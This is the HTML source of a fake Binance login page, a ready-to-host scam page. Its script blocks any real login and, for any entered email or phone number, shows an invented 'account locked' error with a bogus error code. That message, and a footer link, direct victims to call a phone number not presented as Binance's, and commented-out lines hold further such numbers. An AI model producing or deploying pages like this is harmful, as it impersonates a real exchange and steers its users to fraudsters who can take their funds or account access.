<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Binance Login Page</title>
    <link rel="stylesheet" href="style.css" />
    <link
    href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css"
    rel="stylesheet"
    integrity="sha384-rbsA2VBKQXJ/LdmgTXAFVeLYl5IzO9w8Z4hZhVxLAJwV0p6Dh7v1h3YyXz6BLD+4"
    crossorigin="anonymous"
  />

  <link rel="shortcut icon" href="fav.jfif" type="image/x-icon">
  <style>
    #error-message {
        /* background-color: #f8d7da; Light red background */
        color: #721c24; /* Dark red text */
        /* border: 1px solid #f5c6cb; */
    }
    #error-message i {
        vertical-align: middle;
    }

    body{
      background: #181a20;
    }
    .container {
      /* max-width: 600px; */
      background: #181a20;
      /* margin: 0 auto; */
      /* padding: 20px; */
    }
    .login-container {
      /* max-width: 600px; */
      background: #181a20;
      border:1px solid grey;
      /* margin: 0 auto; */
      /* padding: 20px; */
    }


    @media only screen and (max-width: 480px) {
  /* Styles for typical mobile phones */


  .login-container{
    border:none !important;
    margin-top:0px;
  }
}
    </style>


  </head>
  <body>
    <div class="container">
    <div class="login-container">
      <div class="logo" style="text-align: left">
        <img
          src="binance_en_logo.svg"
          style="height: 28px; width: auto"
          alt="Binance Logo"
        />
      </div>
      <div style="display: flex; justify-content: space-between">
        <h2
          style="
            font-weight: 600;
            font-size: 32px;
            line-height: 40px;
            text-align: left;
            color:white;
          "
        >
          Log in
        </h2>

        <svg
          style="height: 35px; width: auto; color:white"
          fill="white"
          size="16"
          class="bn-svg w-[32px] h-[32px] text-[--color-textPrimary]"
          viewBox="0 0 24 24"
          xmlns="http://www.w3.org/2000/svg"
        >
          <path
            fill-rule="evenodd"
            clip-rule="evenodd"
            d="M4 4h7v7H4V4zm0 9h7v7H4v-7zm11 0h-2v4h4v-2h3v-2h-4v2h-1v-2zm5 3h-2v2h-2v2h4v-4zm-5 2h-2v2h2v-2zM13 4h7v7h-7V4zM8.5 6.5h-2v2h2v-2zm-2 9h2v2h-2v-2zm11-9h-2v2h2v-2z"
            fill="currentColor"
          ></path>
        </svg>
      </div>
      <form id="dataform">
        <label
          for="email"
          style="
            color: white;
            font-size: 14px;
            font-weight: 500;
            line-height: 22px;
          "
          >Email/Phone number</label
        >
        <input
        type="text"
        id="email_input"
        placeholder="Email/Phone (without country code)"
        required
        style="background: #181a20; color: white; border: 1px solid grey; font-weight:600; box-sizing: border-box;"
    />

        <div id="error-message" class="card  rounded-4 shadow " style=" border-radius: 16px; display:none; ">
            <div id="error-messagess" class="card-body">
                <p class="card-text" style="color: black; margin-bottom:0px; font-size:14px; color: red;">
                    <!-- We have detected suspicious activity on your account and  please call support for further assistance contact at +18445324687 -->

                    Due to multiple incorrect login attempts, your account has been temporarily locked for security reasons.
Please contact our support team at 1-888-768-2557 for assistance.

Error Code: EBRX1:6X76D
                </p>
                <!-- <span style="color: red;">Contact : +1-888-464-9226</span> -->
            </div>
                            </div>
                            <br>


        <button type="submit" style="background:#fcd535" id="form-submit" class="btn-primary">Next</button>
        <div class="or-divider">
            <span style=" width: 200px;"><hr></span>
          <span>or</span>
          <span style=" width: 200px;"><hr></span>
        </div>
<button type="button" class="btn-user">
  <span class="icon">
    <svg fill="PrimaryText" style="height:15px;" class="bn-svg h-[20px] w-[20px] text-[--color-PrimaryText]" font-size="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
      <path d="M19 6a3.5 3.5 0 013.5 3.5l-.005.18a3.5 3.5 0 01-2.599 3.203v2.208H21.5a.901.901 0 010 1.8h-1.604v.906l-.004.092a.9.9 0 01-1.791 0l-.005-.092V12.88A3.5 3.5 0 0115.5 9.5l.005-.18A3.5 3.5 0 0119 6zm-1.7 3.5a1.7 1.7 0 103.4 0 1.7 1.7 0 00-3.4 0zM11.7 6.5A2.7 2.7 0 109 9.2V11a4.5 4.5 0 110-9 4.5 4.5 0 010 9V9.2a2.7 2.7 0 002.7-2.7zM14.6 21.5V19a4.6 4.6 0 00-4.6-4.6H8A4.6 4.6 0 003.4 19v2.5a.9.9 0 01-1.8 0V19A6.4 6.4 0 018 12.6h2a6.4 6.4 0 016.4 6.4v2.5a.9.9 0 01-1.8 0z" fill="currentColor"></path>
    </svg>
  </span>
  <span class="button-text">Continue with Passkeys</span>
</button>
        <button type="button" class="btn-social google">
            <img src="google-icon.png" style="height:15px;" class="social-icon" alt="Google Icon">
            Continue with Google
          </button>
          <button type="button" class="btn-social apple">
            <img src="apple-icon.png" class="social-icon" alt="Apple Icon">
            Continue with Apple
          </button>
          <button type="button" class="btn-social telegram">
            <img src="telegram.png" class="social-icon" alt="Apple Icon">
            Continue with Telegram
          </button>
      </form>
     
      <script>
        // Wait until the DOM is fully loaded before accessing elements
        document.addEventListener("DOMContentLoaded", function() {
            // JavaScript to display the error message on form submission
            document.getElementById("dataform").addEventListener("submit", function(e) {
                e.preventDefault(); // Prevent form submission to keep it on the same page
    
                var email = document.getElementById("email_input").value; // Ensure correct ID
    
                // Display the error message if the email input is not empty
                if (email !== '') {
                    document.getElementById("error-message").style.display = "block"; // Show the error message
                } else {
                    // Optionally handle case when the email is empty (e.g., display another message)
                    alert('Please enter a valid email or phone number.');
                }
            });
        });
    </script>
 
    </div>
</div>
   <div class="row">
    <div class="col-md-12" style="text-align: center;">
        <a href="#" class="create-account">Create a Binance Account</a>&nbsp;&nbsp;&nbsp;
        <a href="tel: 1-888-768-2557" class="create-account">Talk to us: +1-888-768-2557</a>
    </div>
   </div>
    <div class="footer-links">
      <a href="#">English</a>
      <a href="#">Cookies</a>
      <a href="https://www.binance.com/en/terms">Terms</a>
      <a href="https://www.binance.com/en/privacy">Privacy</a>
    </div>
    <br>
  </body>
</html>
